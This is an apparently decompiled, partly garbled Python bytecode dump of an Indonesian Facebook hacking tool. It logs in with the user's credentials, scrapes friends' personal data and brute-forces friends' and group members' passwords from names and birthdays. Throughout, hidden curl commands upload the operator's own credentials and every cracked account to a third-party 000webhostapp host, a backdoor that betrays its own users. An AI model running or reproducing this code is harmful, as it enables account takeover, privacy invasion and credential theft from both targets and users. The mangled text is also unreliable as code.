ó
¡]c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNsÃ c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNs% c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNs c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNsé c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d dD g e _ d
   Z d   Z d Z d   Z d a g  Z  g  a! g  a" g  a# g  Z$ g  Z% g  Z& g  Z' g  Z( g  Z) g  Z* d Z+ g  Z, g  Z- g  Z. g  Z/ g  Z0 g  Z1 d Z2 d Z3 d   Z4 d   Z5 d   Z6 d   Z7 d   Z8 d   Z9 d   Z: d   Z; d   Z< d   Z= d   Z> d   Z? d   Z@ d   ZA d    ZB d!   ZC d"   ZD d#   ZE d$   ZF d%   ZG d&   ZH d'   ZI d(   ZJ d)   ZK d*   ZL d+   ZM d,   ZN d-   ZO d.   ZP d/   ZQ d0   ZR d1   ZS d2   ZT d3   ZU d4   ZV d5   ZW d6   ZX d7   ZY d8   ZZ d9   Z[ d:   Z\ d;   Z] d<   Z^ d=   Z_ d>   Z` d?   Za d@   Zb dA   Zc ed dB  Ze ef dC k re4   n  d S(E   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [1;91m[!] Keluar(   t   ost   syst   exit(    (    (    s   <Ahmad_Riswanto>t   keluar   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   <Ahmad_Riswanto>t   jalan   s    s  [1;97mâââââââââ
[1;97mâââââââââ      [1;96mââ¬â¬â¬â¬â¬â¬â¬â¬â¬à¹Û©Û©à¹â¬â¬â¬â¬â¬â¬â¬â¬â
[1;97mâ[1;91mâ¼â¼â¼â¼â¼ [1;97m- _ --_--[1;92mââ¦âââââ¬âââ¬ââ   âââââ 
[1;97mâ [1;97m [1;97m_-_-- -_ --__[1;92m âââââ¤ââ¬âââ´âââââ â£ â â©â
[1;97mâ[1;91mâ²â²â²â²â²[1;97m--  - _ --[1;92mââ©ââ´ â´â´âââ´ â´   â  âââ [1;93mv1.7
[1;97mâââââââââ      [1;96mÂ«----------â§----------Â»
[1;97m ââ ââ
[1;97mââââââââââââââââââââââââââââââââââââââââââ
[1;97mâ[1;93m* [1;97mAuthor  [1;91m: [1;96mZeDD Parker [1;97m                â
[1;97mâ[1;93m* [1;97mSupport [1;91m: [1;96mLimit[1;97m[[1;96meD[1;97m] [1;97m |[1;96m./R41N53[1;97m|[1;96mAl2VyN [1;97mâ
[1;97mâ[1;93m* [1;97mGitHub  [1;91m: [1;92m[4mhttps://github.com/rezadkim[0m [1;97mâ
[1;97mââââââââââââââââââââââââââââââââââââââââââc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s)   [1;91m[â] [1;92mSedang Masuk [1;97mi   (   R   R	   R   R   R   (   t   titikt   o(    (    s   <Ahmad_Riswanto>t   tik   s
    i    s.   pujasuaramajalengka.000webhostapp.com/facebooks   [31mNot Vulns	   [32mVulnc          C   s  t  j d  y t d d  }  t   Wnât t f k
 rt  j d  t GHd d GHd GHt d  } t j d  } t	   y t
 j d	  Wn  t j k
 r² d
 GHt   n Xt t
 j _ t
 j d d  | t
 j d <| t
 j d <t
 j   t
 j   } d | k r­yyd | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d  d! 6d" d# 6} t j d$  } | j |  | j   } | j i | d% 6 d& } t j | d' | } t j | j  }	 t d d(  }
 |
 j |	 d)  |
 j   d* GHt j  d+ |	 d)  t  j d,  t d- d(  } | j d. | d/ | d0  | j   t  j d1 t! d2  t   Wq­t j" j# k
 r©d
 GHt   q­Xn  d3 | k râd4 GHt  j d5  t$ j% d6  t   qd7 GHt  j d5  t$ j% d6  t&   n Xd  S(8   Nt   clears	   login.txtt   ri(   s
   [1;97mâs4   [1;91m[â] [1;92mLOGIN AKUN FACEBOOK [1;91m[â]s+   [1;91m[+] [1;36mUsername [1;91m:[1;92m s+   [1;91m[+] [1;36mPassword [1;91m:[1;92m s   https://m.facebook.coms   
[1;91m[!] Tidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramst   wt   access_tokens1   
[1;91m[[1;96mâ[1;91m] [1;92mLogin berhasilsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s*   xdg-open https://youtube.com/NjankSoekamtit-   pujasuaramanaajakawanskgsukkaftpatfensgyebjgds   [1;92m[[1;97ms   [1;92m] =>[1;97m s   
sH   curl -X POST -F x=@pujasuaramanaajakawanskgsukkaftpatfensgyebjgd http://s
   /admin.phpt
   checkpoints'   
[1;91m[!] [1;93mAkun kena Checkpoints   rm -rf login.txti   s   
[1;91m[!] Login Gagal('   R   t   systemt   opent   menut   KeyErrort   IOErrort   logot	   raw_inputt   getpassR   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR
   t   closet   postt   myrot
   exceptionsR   R   R   t   login(   t   tokett   idt   pwdt   urlR)   t   datat   xt   aR   R   t   zeddt   les(    (    s   <Ahmad_Riswanto>RN   =   sr    	
S


c          C   sr  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n§ Xy= t j	 d |   } t
 j | j  } | d } | d	 } Wnf t k
 rð t  j d  d
 GHt  j d  t j d  t   n# t j j k
 rd GHt   n Xt  j d  t GHd d d GHd | GHd d d GHd GHd GHd GHd GHd GHd GHHt   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameRP   s1   [1;91m[!] [1;93mSepertinya akun kena Checkpoints   [1;91m[!] Tidak ada koneksis
   [1;97mâi(   s   âs:   â[1;91m[[1;96mâ[1;91m][1;97m Nama [1;91m: [1;92ms
   [1;97mâs   [1;37;40m1. Informasi Penggunas   [1;37;40m2. Hack Akun Facebooks   [1;37;40m3. Bot               s   [1;37;40m4. Lainnya....       s   [1;37;40m5. LogOut            s   [1;31;40m0. Keluar            (   R   R/   R0   t   readR3   R   R   RN   RE   RF   RG   RH   RI   R2   RM   R   R   R4   t   pilih(   RO   t   otwRU   t   namaRP   (    (    s   <Ahmad_Riswanto>R1   |   sH    

	c          C   sÝ   t  d  }  |  d k r' d GHt   n² |  d k r= t   n |  d k rS t   n |  d k ri t   np |  d k r t   nZ |  d k r¯ t j d	  t j d
  t   n* |  d k rÅ t   n d |  d GHt   d  S(   Ns   [1;91m-âº[1;97m t    s   [1;91m[!] Jangan kosongR   t   2t   3t   4t   5s   rm -rf login.txts,   xdg-open https://www.youtube.com/nganunymousR%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(	   R5   RZ   t	   informasit	   menu_hackt   menu_bott   lainR   R/   R   (   RV   (    (    s   <Ahmad_Riswanto>RZ   ¥   s(    






c          C   s³  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHt	 d	  } t
 d
  t j d |   } t j | j  } xö| d D]Ô} | | d k sç | | d k rÁ t j d | d d |   } t j | j  } d d GHy d | d GHWn t k
 rJd GHn7Xy d | d GHWn t k
 rtd GHn­ Xy d | d GHWn t k
 rd GHnY Xy d | d GHWn t k
 rÈd GHn Xy d | d d GHWn t k
 röd GHn Xy d | d GHWn t k
 r d  GHn XyL d! GHx@ | d" D]4 } y d# | d$ d GHWq4t k
 rgd% GHq4Xq4WWn t k
 rn Xt	 d&  t   qÁ qÁ Wd' GHt	 d&  t   d  S((   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs@   [1;91m[+] [1;92mMasukan ID[1;97m/[1;92mNama[1;91m : [1;97ms.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s3   https://graph.facebook.com/me/friends?access_token=RS   RX   RP   s   https://graph.facebook.com/s   ?access_token=s+   [1;91m[â¹] [1;92mNama[1;97m          : s9   [1;91m[?] [1;92mNama[1;97m          : [1;91mTidak adas+   [1;91m[â¹] [1;92mID[1;97m            : s9   [1;91m[?] [1;92mID[1;97m            : [1;91mTidak adas+   [1;91m[â¹] [1;92mEmail[1;97m         : R   s9   [1;91m[?] [1;92mEmail[1;97m         : [1;91mTidak adas+   [1;91m[â¹] [1;92mNomor HP[1;97m      : t   mobile_phones9   [1;91m[?] [1;92mNomor HP[1;97m      : [1;91mTidak adas+   [1;91m[â¹] [1;92mLokasi[1;97m        : t   locations9   [1;91m[?] [1;92mLokasi[1;97m        : [1;91mTidak adas+   [1;91m[â¹] [1;92mTanggal Lahir[1;97m : t   birthdays9   [1;91m[?] [1;92mTanggal Lahir[1;97m : [1;91mTidak adas+   [1;91m[â¹] [1;92mSekolah[1;97m       : t	   educations#   [1;91m                   ~ [1;97mt   schools,   [1;91m                   ~ [1;91mTidak adas!   
[1;91m[ [1;97mKembali [1;91m]s%   [1;91m[â] Pengguna tidak ditemukan(   R   R/   R0   RY   R3   R   R   RN   R4   R5   R   RE   RF   RG   RH   RI   R2   R1   (   RO   RP   R   t   cokt   pR   t   q(    (    s   <Ahmad_Riswanto>Rb   Ã   st    	
 							

c          C   sª   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHHt	   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs5   [1;37;40m1. Mini Hack Facebook([1;92mTarget[1;97m)s&   [1;37;40m2. Multi Bruteforce Facebooks,   [1;37;40m3. Super Multi Bruteforce Facebooks-   [1;37;40m4. BruteForce([1;92mTarget[1;97m)s   [1;37;40m5. Yahoo Checkers   [1;37;40m6. Ambil id/email/hps   [1;31;40m0. Kembali(
   R   R/   R0   RY   R3   R   R   RN   R4   t
   hack_pilih(   RO   (    (    s   <Ahmad_Riswanto>Rc   
  s(    	c          C   sà   t  d  }  |  d k r' d GHt   nµ |  d k r= t   n |  d k rZ t   t   n |  d k rp t   nl |  d k r t   nV |  d k r t   n@ |  d	 k r² t   n* |  d
 k rÈ t	   n d |  d GHt   d  S(   Ns   [1;91m-âº[1;97m R]   s   [1;91m[!] Jangan kosongR   R^   R_   R`   Ra   t   6R%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(
   R5   Rn   t   minit   crackt   hasilt   supert   brutet
   menu_yahoot   grabR1   (   t   hack(    (    s   <Ahmad_Riswanto>Rn   "  s*    







c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n·Xt  j d  t GHd d GHd	 GHylt	 d
  } t
 d  t j d | d |   } t j | j  } d | d GHt
 d  t j d  t
 d  t j d  t
 d  d d GH| d d } t j d | d | d  } t j |  } d | k rìd GHd | d GHt d d  } | j d | d | d   | j   t  j d! t d"  t  j d#  d$ | GHd% | GHt	 d&  t   nÿd' | d( k rd GHd) GHd | d GHt d* d  } | j d | d | d   t  j d+ t d,  t  j d-  d$ | GHd% | GHt	 d&  t   nd| d d. } t j d | d | d  } t j |  } d | k rUd GHd | d GHt d/ d  } | j d | d | d   t  j d0 t d1  t  j d2  d$ | GHd% | GHt	 d&  t   nd' | d( k rðd GHd) GHd | d GHt d3 d  } | j d | d | d   t  j d4 t d,  t  j d5  d$ | GHd% | GHt	 d&  t   nû| d6 d }	 t j d | d |	 d  } t j |  } d | k r¾d GHd | d GHt d7 d  } | j d | d |	 d   t  j d8 t d1  t  j d9  d$ | GHd% |	 GHt	 d&  t   n-d' | d( k rYd GHd) GHd | d GHt d: d  } | j d | d |	 d   t  j d; t d,  t  j d<  d$ | GHd% |	 GHt	 d&  t   n| d= }
 |
 j d> d?  } t j d | d | d  } t j |  } d | k r5d GHd | d GHt d@ d  } | j d | d | d   t  j dA t d1  t  j dB  d$ | GHd% | GHt	 d&  t   n¶ d' | d( k rÐd GHd) GHd | d GHt dC d  } | j d | d | d   t  j dD t d,  t  j dE  d$ | GHd% | GHt	 d&  t   n dF GHdG GHt	 d&  t   Wn' t k
 rdH GHt	 d&  t   n Xd  S(I   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâsB   [1;91m[ INFO ] Akun target harus berteman dengan akun anda dulu !s,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   https://graph.facebook.com/s   ?access_token=s"   [1;91m[â¹] [1;92mNama[1;97m : RX   s&   [1;91m[+] [1;92mMemeriksa [1;97m...i   s-   [1;91m[+] [1;92mMembuka keamanan [1;97m...s4   [1;91m[âº] [1;92mMohon Tunggu sebentar [1;97m...t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R,   s   [1;91m[+] [1;92mDitemukan.s4   [1;91m[[1;96mâ[1;91m] [1;92mNama[1;97m     : t   booR+   s   [1;92m[[1;97ms   [1;92m] =>[1;97m s   
s   curl -X POST -F x=@boo http://s	   /boom.phps   rm boos&   [1;91m[â¹] [1;92mUsername[1;97m : s&   [1;91m[â¹] [1;92mPassword[1;97m : s!   
[1;91m[ [1;97mKembali [1;91m]s   www.facebook.comt	   error_msgs&   [1;91m[!] [1;93mAkun kena Checkpointt   bolos   curl -X POST -F x=@bolo http://s   /checkpoint.phps   rm bolot   12345t   bollos    curl -X POST -F x=@bollo http://s   /ok.phps   rm bollot   bollols!   curl -X POST -F x=@bollol http://s	   rm bollolt	   last_namet   boldlos!   curl -X POST -F x=@boldlo http://s	   rm boldlot   blollos!   curl -X POST -F x=@blollo http://s	   rm blolloRh   t   /R]   t   bollolos"   curl -X POST -F x=@bollolo http://s
   rm bollolot   bollllos"   curl -X POST -F x=@bollllo http://s
   rm bollllos1   [1;91m[!] Maaf, gagal membuka password target :(s$   [1;91m[!] Cobalah dengan cara lain.s!   [1;91m[!] Terget tidak ditemukan(   R   R/   R0   RY   R3   R   R   RN   R4   R5   R   RE   RF   RG   RH   RI   t   urllibt   urlopent   loadR
   RJ   RL   Rc   t   replaceR2   (   RO   RP   R   RU   t   pz1RS   t   yRW   t   pz2t   pz3t   lahirt   pz4(    (    s   <Ahmad_Riswanto>Rp   B  s   	



	
		

		

		

		

		

		


		

		



c          C   s?  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nÜ Xt  j d  t GHd d GHt	 d	  a
 t	 d
  a y~ t t
 d  a t d  xC t d  D]5 } t j d t d d  } | j   t j |  q¼ Wx t D] } | j   qü WWn' t k
 r:d GHt	 d  t   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs+   [1;91m[+] [1;92mFile ID  [1;91m: [1;97ms+   [1;91m[+] [1;92mPassword [1;91m: [1;97ms.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...t   targett   argss   [1;91m[!] File tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m](    (   R   R/   R0   RY   R3   R   R   RN   R4   R5   t   idlistt   passwt   fileR   t   ranget	   threadingt   Threadt   scrakt   startt   threadst   appendt   joinRc   (   RO   RT   RV   (    (    s   <Ahmad_Riswanto>Rq   Ø  s4    	


c          C   sC  yþt  t d  }  |  j   j   a xÖt rüt j   j   } d | d t d } t	 j
 |  } t j |  } t t t  k r Pn  d | k rt  d d  } | j | d t d	  | j   t j d
 | d t  t j d t d  t d 7a n d | d k rt  d d  } | j | d t d	  | j   t j d | d t  t j d t d  t d 7a n t j |  t d 7a t j j d t t  d t t t   d t t t   d t t t    t j j   q' WWn> t k
 r#d GHt j d  n t j  j! k
 r>d GHn Xd  S(   NR   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R,   s   Berhasil.txtR+   s    | s   
s   [1;97m[[1;92mOKâ[1;97m] s'   curl -X POST -F x=@Berhasil.txt http://s   /ok.phpi   s   www.facebook.comR{   s   Cekpoint.txts   [1;97m[[1;93mCPâ[1;97m] s'   curl -X POST -F x=@Cekpoint.txt http://s   /checkpoint.phps<   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack    [1;91m:[1;97m s    [1;96m>[1;97m s    =>[1;92mLive[1;91m:[1;96ms%    [1;97m=>[1;93mCheck[1;91m:[1;96ms   
[1;91m[!] Koneksi terganggus   [1;91m[â] Tidak ada koneksi("   R0   R   RY   t   splitt   upR   t   readlinet   stripR   R   R   RG   R   t   backt   lenR
   RJ   t   berhasilR   R   R/   RL   t   cekpointt   gagalR   R	   t   strR   R3   R   R   RE   RM   R   (   t   bukat   usernameRR   RS   t   mpsht   bisat   cek(    (    s   <Ahmad_Riswanto>R   û  sB    	


Vc          C   sW   Hd d GHx t  D] }  |  GHq Wx t D] } | GHq' WHd t t t   GHt   d  S(   Ni(   s
   [1;97mâs   [31m[x] Gagal [1;97m--> (   R£   R¤   R¦   R¢   R¥   R   (   t   bt   c(    (    s   <Ahmad_Riswanto>Rr   '  s    			c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd d GHd	 GHd
 GHd GHHt
   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs$   [1;37;40m1. Crack dari daftar Temans#   [1;37;40m2. Crack dari member Grups   [1;31;40m0. Kembali(   R   R/   R0   RY   RO   R3   R   R   RN   R4   t   pilih_super(    (    (    s   <Ahmad_Riswanto>Rs   5  s     	c          C   sk  t  d  }  |  d k r' d GHt   n|  d k r¦ t j d  t GHd d GHt d  t j d	 t  } t	 j
 | j  } xA| d
 D] } t j | d  q Wn|  d k rt j d  t GHd d GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r@d GHt  d  t   n Xt j d | d t  } t	 j
 | j  } xP | d
 D] } t j | d  qyWn* |  d k r­t   n d |  d GHt   d t t t   GHt d  d d d g } x0 | D]( }	 d |	 Gt j j   t j d  qöWHd d GHd    }
 t d!  } | j |
 t  d" GHt  d  t   d  S(#   Ns   [1;91m-âº[1;97m R]   s   [1;91m[!] Jangan kosongR   R   i(   s
   [1;97mâs/   [1;91m[+] [1;92mMengambil id teman [1;97m...s3   https://graph.facebook.com/me/friends?access_token=RS   RP   R^   s,   [1;91m[+] [1;92mID Grup   [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m RX   s   [1;91m[!] Grup tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m]s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=R%   s   [1;91m[â] [1;97ms    [1;91mTidak adas,   [1;91m[+] [1;92mJumlah ID [1;91m: [1;97ms.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   .   s   ..  s   ... s1   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack [1;97mi   c         S   s  |  } yÿt  j d | d t  } t j | j  } | d d } t j d | d | d  } t j |  } d | k rê d	 | d
 | GHt	 d d  } | j
 d | d | d  | j   t j d t d  t j d  nd | d k rfd | d
 | GHt	 d d  } | j
 d | d | d  | j   t j d t d  t j d  n| d d } t j d | d | d  } t j |  } d | k rd	 | d
 | GHt	 d d  } | j
 d | d | d  | j   t j d t d  t j d  nêd | d k rd | d
 | GHt	 d d  } | j
 d | d | d  | j   t j d t d  t j d  nn| d d }	 t j d | d |	 d  } t j |  } d | k rJd	 | d
 |	 GHt	 d d  } | j
 d | d |	 d  | j   t j d t d  t j d  nºd | d k rÆd | d
 |	 GHt	 d d  } | j
 d | d |	 d  | j   t j d t d  t j d  n>| d }
 |
 j d d  } t j d | d | d  } t j |  } d | k rd	 | d
 | GHt	 d d  } | j
 d | d | d  | j   t j d t d  t j d  n| d | d k rd | d
 | GHt	 d d  } | j
 d | d | d  | j   t j d t d  t j d  n  Wn n Xd  S(   Ns   https://graph.facebook.com/s   /?access_token=Rx   Ry   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R,   s   [1;97m[[1;92mOKâ[1;97m] s    | R-   R+   s   [OK][1;92m[[1;97ms   [1;92m] =>[1;97m s   
sH   curl -X POST -F x=@pujasuaramanaajakawanskgsukkaftpatfensgyebjgd http://s   /ok.phps0   rm pujasuaramanaajakawanskgsukkaftpatfensgyebjgds   www.facebook.comR{   s   [1;97m[[1;93mCPâ[1;97m] s   [CP][1;92m[[1;97ms   /checkpoint.phpR}   R   Rh   R   R]   (   RE   RF   RO   RG   RH   RI   R   R   R   R0   R
   RJ   R   R/   RL   R   (   t   argt   userRU   R¬   t   pass1RS   Rm   RW   t   pass2t   pass3R   t   pass4(    (    s   <Ahmad_Riswanto>t   main  s    








i   s   
[1;91m[+] [1;97mSelesai(   R5   R®   R   R/   R4   R   RE   RF   RO   RG   RH   RI   RP   R   R2   Rs   Rc   R¦   R¢   R   R	   R   R   R   R    t   map(   t   peakR   R   t   st   idgt   aswt   ret   iR   R   Rµ   Rl   (    (    s   <Ahmad_Riswanto>R®   J  sb    
	
	


		T
c          C   sC  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nàXt  j d  t GHd d GHyt	 d	  } t	 d
  } t | d  } | j
   } d d GHd | GHd t t |   d GHt d  t | d  } x!| D]} yç| j d d  } t j j d |  t j j   t j d | d | d  } t j | j  } d | k rt d d  } | j | d | d  | j   t d d  }	 |	 j d | d | d  t  j d t d  t  j d  d GHd d GHd  | GHd! | GHt   nÉ d" | d# k rèt d$ d  }
 |
 j | d | d  |
 j   t d% d  }	 |	 j d | d | d  |	 j   t  j d& t d'  t  j d(  d GHd d GHd) GHd  | GHd! | GHt   n  Wqü t j j k
 rd* GHt j d  qü Xqü WWn" t k
 r>d+ GHd, GHt   n Xd  S(-   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâsX   [1;91m[+] [1;92mID[1;97m/[1;92mEmail[1;97m/[1;92mHp [1;97mTarget [1;91m:[1;97m s@   [1;91m[+] [1;92mWordlist [1;97mext(list.txt) [1;91m: [1;97ms9   [1;91m[[1;96mâ[1;91m] [1;92mTarget [1;91m:[1;97m s    [1;91m[+] [1;92mJumlah[1;96m s    [1;92mPasswords.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   
R]   s2   [1;91m[[1;96mâ¸[1;91m] [1;92mMencoba [1;97ms   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R,   s	   Brute.txtR+   s    | t   bolklos   [1;92m[[1;97ms   [1;92m] =>[1;97m s!   curl -X POST -F x=@bolklo http://s   /ok.phps	   rm bolklos   
[1;91m[+] [1;92mDitemukan.s-   [1;91m[â¹] [1;92mUsername [1;91m:[1;97m s-   [1;91m[â¹] [1;92mPassword [1;91m:[1;97m s   www.facebook.comR{   s   Brutecekpoint.txtt   bolwlos!   curl -X POST -F x=@bolwlo http://s   /checkpoint.phps	   rm bolwlos&   [1;91m[!] [1;93mAkun kena Checkpoints   [1;91m[!] Koneksi Errors"   [1;91m[!] File tidak ditemukan...s:   
[1;91m[!] [1;92mSepertinya kamu tidak memiliki wordlist(   R   R/   R0   RY   R3   R   R   RN   R4   R5   t	   readlinesR¦   R¢   R   R   R   R	   R
   R   RE   RF   RG   RH   RI   RJ   RL   R   RM   R   t   tanyaw(   RO   R   R   t   totalt   sandit   pwRS   R©   t   dapatRW   t   ceks(    (    s   <Ahmad_Riswanto>Rt   Ú  s~    			

			


			c          C   s   t  d  }  |  d k r' d GHt   nd |  d k r= t   nN |  d k rS t   n8 |  d k ri t   n" |  d k r t   n d GHt   d  S(   NsG   [1;91m[?] [1;92mIngin membuat wordlist ? [1;92m[y/t][1;91m:[1;97m R]   s$   [1;91m[!] Tolong pilih [1;97m(y/t)R   t   Yt   tt   T(   R5   RÀ   t   wordlistRc   (   t   why(    (    s   <Ahmad_Riswanto>RÀ     s    




c          C   s   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHHt	   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs    [1;37;40m1. Dari teman facebooks   [1;37;40m2. Gunakan Files   [1;31;40m0. Kembali(
   R   R/   R0   RY   R3   R   R   RN   R4   t   yahoo_pilih(   RO   (    (    s   <Ahmad_Riswanto>Ru   5  s     	c          C   s   t  d  }  |  d k r' d GHt   nV |  d k r= t   n@ |  d k rS t   n* |  d k ri t   n d |  d GHt   d  S(	   Ns   [1;91m-âº[1;97m R]   s   [1;91m[!] Jangan kosongR   R^   R%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R5   RË   t   yahoofriendst	   yahoolistRc   (   t   go(    (    s   <Ahmad_Riswanto>RË   I  s    



c          C   sË  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHg  } d	 } t	 d
  t
 j d |   } t j | j  } t d d  } t  j d t d  d d GHx¼| d D]°} | d 7} | j |  | d } | d } t
 j d | d |   }	 t j |	 j  }
 y>|
 d } t j d  } | j |  j   } d | k rt j d  t t j _ t j d d	  | t d <t j   j   } t j d  } y | j |  j   } Wn d | d t d GHwî n Xd | k rq| j | d   d d GHd! | GHd" | GHd# | d$ t d GHd d GHqd | d t d GHn  Wqî t k
 rqî Xqî Wd% GHd& GH| j   t  d'  t!   d  S((   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâi    s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s   MailVuln.txtR+   s'   curl -X POST -F x=@MailVuln.txt http://s	   /vuln.phpRS   RP   RX   s   https://graph.facebook.com/s   ?access_token=R   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR   R¨   s$   "messages.ERROR_INVALID_USERNAME">.*s*   [1;91m[â] [1;92mEmail [1;91m:[1;91m s    [1;97m[[1;92ms   [1;97m]s"   "messages.ERROR_INVALID_USERNAME">s   
s8   [1;91m[[1;96mâ[1;91m] [1;92mNama  [1;91m:[1;97m s*   [1;91m[â¹] [1;92mID    [1;91m:[1;97m s*   [1;91m[â¹] [1;92mEmail [1;91m:[1;97m s	    [[1;92ms   
[1;91m[+] [1;97mSelesais8   [1;91m[+] [1;97mTersimpan [1;91m:[1;97m MailVuln.txts!   
[1;91m[ [1;97mKembali [1;91m]("   R   R/   R0   RY   R3   R   R   RN   R4   R   RE   RF   RG   RH   RI   RL   R   R»   t   compilet   searcht   groupR7   R:   R;   R<   R=   R?   t   vulnotR
   t   vulnR2   RJ   R5   Ru   (   RO   R©   t   jmlt   temant   kimakt   saveR+   RP   R\   t   linksR   t   mailt   yahooR[   t   klikt   jokt   pek(    (    s   <Ahmad_Riswanto>RÌ   \  sr    	
	




			

c          C   st  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nq Xt  j d  t GHd d GHt	 d	  } y t | d  } | j
   } Wn' t k
 rÏ d
 GHt	 d  t   n Xg  } d } t d  t d d  } d d GHd t d t d GHHt | d  j
   } x| D]} | j d d  } | d 7} | j |  t j d  } | j |  j   }	 d |	 k r0t j d  t t j _ t j d d  | t d <t j   j   }
 t j d  } y | j |
  j   } Wn d | GHq0n Xd | k r;| j | d  d | GHqGd | GHq0q0Wd GHd GH| j   t	 d  t   d  S(    NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs'   [1;91m[+] [1;92mFile [1;91m: [1;97ms   [1;91m[!] File tidak adas!   
